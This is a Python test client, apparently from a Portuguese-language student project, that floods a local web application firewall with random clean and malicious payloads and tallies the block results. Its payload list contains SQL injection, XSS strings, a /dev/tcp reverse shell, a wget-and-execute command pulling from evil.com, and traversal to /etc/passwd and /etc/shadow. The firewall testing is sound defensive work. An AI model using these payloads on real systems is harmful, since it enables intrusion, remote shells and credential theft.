#!/usr/bin/env python3
"""
Cliente TCP — TCC Gerenciamento de Rede
Bombardeia o WAF (porta 8080) com payloads variados.
Distribuição garantida: 60% limpos (ALLOWED) e 40% maliciosos (BLOCKED).
"""
import socket
import time
import os
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

WAF_HOST     = 'localhost'
WAF_PORT     = 8080
NUM_MESSAGES = int(os.environ.get("NUM_MESSAGES", 100))
WORKERS      = int(os.environ.get("WORKERS", 10))

MALICIOUS_PATTERNS = [
    "' OR '1'='1'; DROP TABLE users; --",
    "UNION SELECT username, password FROM users--",
    "1; INSERT INTO logs VALUES ('hacked')--",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:eval(atob('YWxlcnQoMSk='))",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "| wget http://evil.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s",
    "../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
]

CLEAN_CHARS = string.ascii_letters + string.digits + " .,!?-_:/\n\t"

random.seed(42)  # garante sequência idêntica em todas as execuções

def gen_clean_payload() -> bytes:
    size = random.randint(512, 2048)
    return "".join(random.choices(CLEAN_CHARS, k=size)).encode("utf-8")

def gen_malicious_payload() -> bytes:
    pattern = random.choice(MALICIOUS_PATTERNS)
    prefix = "".join(random.choices(CLEAN_CHARS, k=random.randint(50, 200)))
    suffix = "".join(random.choices(CLEAN_CHARS, k=random.randint(50, 200)))
    return f"{prefix}{pattern}{suffix}".encode("utf-8")

def build_sequence(n: int) -> list[bytes]:
    """Retorna lista embaralhada com exatamente 60% limpos e 40% maliciosos."""
    n_clean    = round(n * 0.6)
    n_malicious = n - n_clean
    seq = [gen_clean_payload() for _ in range(n_clean)] + \
          [gen_malicious_payload() for _ in range(n_malicious)]
    random.shuffle(seq)
    return seq

def wait_for_server(host, port, max_attempts=30) -> bool:
    for attempt in range(1, max_attempts + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((host, port))
            print(f"✅ WAF disponível após {attempt} tentativa(s).")
            return True
        except Exception:
            print(f"⏳ Aguardando WAF... tentativa {attempt}/{max_attempts}")
            time.sleep(1)
    return False

def send_payload(payload: bytes) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        s.connect((WAF_HOST, WAF_PORT))
        s.sendall(payload)
        s.shutdown(socket.SHUT_WR)
        response = s.recv(256).decode("utf-8", errors="replace").strip()
    return response

def main():
    print("=" * 50)
    print(f"  Cliente TCP — WAF {WAF_HOST}:{WAF_PORT}")
    print(f"  Mensagens: {NUM_MESSAGES} | Workers: {WORKERS} | Sem delay")
    print(f"  Distribuição: 60% limpos / 40% maliciosos")
    print("=" * 50)

    if not wait_for_server(WAF_HOST, WAF_PORT):
        print("❌ WAF não respondeu. Encerrando.")
        return

    payloads = build_sequence(NUM_MESSAGES)
    print(f"\n🚀 Iniciando envio...")
    allowed = blocked = errors = 0
    t_start = time.time()

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(send_payload, p): i for i, p in enumerate(payloads)}
        for future in as_completed(futures):
            i = futures[future]
            try:
                response = future.result()
                if response.startswith("BLOCKED"):
                    blocked += 1
                else:
                    allowed += 1
            except Exception as e:
                errors += 1
                print(f"[ERRO] payload {i}: {e}", flush=True)

    elapsed = round(time.time() - t_start, 2)
    rate    = round(NUM_MESSAGES / elapsed, 1) if elapsed > 0 else 0
    print(f"\n✅ Concluído em {elapsed}s (~{rate} msg/s) — ALLOW:{allowed} BLOCK:{blocked} ERRO:{errors}")

if __name__ == "__main__":
    main()
